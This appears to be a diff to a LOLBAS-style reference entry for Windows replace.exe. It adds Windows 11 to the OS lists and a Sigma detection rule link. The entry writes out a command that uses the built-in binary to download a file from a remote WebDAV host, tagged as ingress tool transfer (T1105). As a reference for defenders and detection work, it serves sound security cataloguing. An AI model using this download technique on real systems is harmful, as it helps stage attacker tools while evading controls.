@@ -10,14 +10,14 @@ Commands:
     Category: Copy
     Privileges: User
     MitreID: T1105
-    OperatingSystem: Windows vista, Windows 7, Windows 8, Windows 8.1, Windows 10
+    OperatingSystem: Windows vista, Windows 7, Windows 8, Windows 8.1, Windows 10, Windows 11
   - Command: replace.exe \\webdav.host.com\foo\bar.exe c:\outdir /A
     Description: Download/Copy bar.exe to outdir
     Usecase: Download file
     Category: Download
     Privileges: User
     MitreID: T1105
-    OperatingSystem: Windows vista, Windows 7, Windows 8, Windows 8.1, Windows 10
+    OperatingSystem: Windows vista, Windows 7, Windows 8, Windows 8.1, Windows 10, Windows 11
 Full_Path:
   - Path: C:\Windows\System32\replace.exe
   - Path: C:\Windows\SysWOW64\replace.exe
@@ -25,10 +25,10 @@ Code_Sample:
   - Code:
 Detection:
   - IOC: Replace.exe retrieving files from remote server
+  - Sigma: https://github.com/SigmaHQ/sigma/blob/bea6f18d350d9c9fdc067f93dde0e9b11cc22dc2/rules/windows/process_creation/proc_creation_win_lolbas_replace.yml
 Resources:
   - Link: https://twitter.com/elceef/status/986334113941655553
   - Link: https://twitter.com/elceef/status/986842299861782529
 Acknowledgement:
   - Person: elceef
     Handle: '@elceef'
----
